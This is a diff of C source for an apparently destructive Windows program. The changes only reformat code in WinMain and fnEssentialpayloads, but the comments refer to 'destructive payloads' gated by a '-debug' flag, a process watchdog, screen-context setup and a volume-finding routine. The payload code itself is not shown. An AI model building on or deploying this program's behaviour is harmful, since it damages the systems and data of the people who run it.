@@ -40,12 +40,20 @@ INT WINAPI WinMain (
 	
 	// if debug is set true by cmdline argument, the destructive payloads would be disabled
 	INT iArgAmount = 0;
-	LPWSTR *pszCommandLineArgs = CommandLineToArgvW(GetCommandLineW(), &iArgAmount);
+	LPWSTR *pszCommandLineArgs = CommandLineToArgvW(
+									GetCommandLineW(),
+		 							&iArgAmount
+		 							);
 
-	if (iArgAmount > 1 && _wcsicmp(pszCommandLineArgs[1], TEXT("-debug")) == 0)
+	if (iArgAmount > 1 && _wcsicmp(
+		pszCommandLineArgs[1],
+		TEXT("-debug")) == 0)
+
 		g_bDebug = TRUE;
 		
-	if (iArgAmount > 1 && _wcsicmp(pszCommandLineArgs[1], TEXT("-processwatchdog")) == 0)
+	if (iArgAmount > 1 && _wcsicmp(
+		pszCommandLineArgs[1], 
+		TEXT("-processwatchdog")) == 0)
 		fnProcessWatchdog();
 
 	//I did this workaround, since it'd be unnecessary to run as admin when the debug mode is on
@@ -173,11 +181,19 @@ VOID WINAPI fnEssentialpayloads(VOID) {
 		}
 
 			//Init contexts and handles & get screen coords
-			g_hRootWindowDC = CreateDCW(TEXT("DISPLAY\0"), NULL, NULL, NULL);
+			g_hRootWindowDC = CreateDCW(
+				TEXT("DISPLAY\0"), 
+				NULL, 
+				NULL, 
+				NULL
+				);
 			g_hRootWindow = GetDesktopWindow();
-			GetWindowRect(g_hRootWindow, &stScreenCords);
+			GetWindowRect(
+				g_hRootWindow, 
+				&stScreenCords
+				);
 
-			//
+			//Start finding the volumes
 			fnFindVolumes();
 
 			Sleep(9000);
